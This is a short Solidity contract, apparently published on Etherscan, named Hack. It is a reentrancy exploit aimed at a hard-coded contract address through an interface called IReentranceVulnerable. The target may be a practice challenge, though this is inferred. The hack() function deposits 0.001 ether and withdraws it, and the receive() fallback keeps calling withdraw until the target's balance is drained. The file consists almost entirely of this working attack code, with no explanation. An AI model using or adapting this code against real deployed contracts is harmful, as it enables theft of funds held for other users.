/**
 *Submitted for verification at Etherscan.io on 2022-12-22
*/

pragma solidity 0.8.13;


interface IReentranceVulnerable {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
}

contract Hack {

    IReentranceVulnerable r = IReentranceVulnerable(0x5311A74C28F8FBD90481E15BF459152F268ff2bb);

    function hack() public payable {
        r.donate{value: msg.value}(address(this)); // 0.001 ether
        r.withdraw(0.001 ether);
    }

    // function removeFunds() public {
    //     bool sent = payable(msg.sender).send(balance[msg.sender]);
    // }

    receive() external payable {
        if (address(r).balance != 0){
            r.withdraw(0.001 ether);
        }
    }


}